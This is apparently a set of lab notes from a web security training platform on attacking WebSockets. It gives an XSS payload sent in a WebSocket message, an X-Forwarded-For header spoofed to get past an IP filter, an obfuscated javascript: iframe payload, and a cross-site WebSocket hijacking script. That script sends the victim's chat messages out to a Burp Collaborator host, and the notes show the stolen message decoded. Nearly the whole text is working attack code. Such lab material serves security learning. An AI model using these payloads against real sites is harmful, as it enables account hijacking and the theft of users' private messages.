# Testing for WebSockets security vulnerabilities

## Manipulating WebSocket messages to exploit vulnerabilities
```
{"message":"bbb<img src=1 onerror='alert(1)'>"}
```

## Manipulating the WebSocket handshake to exploit vulnerabilities
Bypass IP filter using `X-Forwarded-For: 1.1.1.1`
WS Message:
```
<iframe src='jAvAsCripT:alert`1`'></iframe>
```

## Cross-site WebSocket hijacking
```
<script>
websocket = new WebSocket('wss://ac441f321eacd6f080ead08c003d0020.web-security-academy.net/chat')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY");
}
function handleReply(event) {
  fetch('https://ttqw3(...).burpcollaborator.net/?'+event.data, {mode: 'no-cors'})
}
</script>
```

Burp Collaborator interaction:  
`{%22user%22:%22Hal%20Pline%22,%22content%22:%22No%20problem%20carlos,%20it&apos;s%20et6uvq%22}`
which decodes to `{"user":"Hal Pline","content":"No problem carlos, it's et6uvq"}`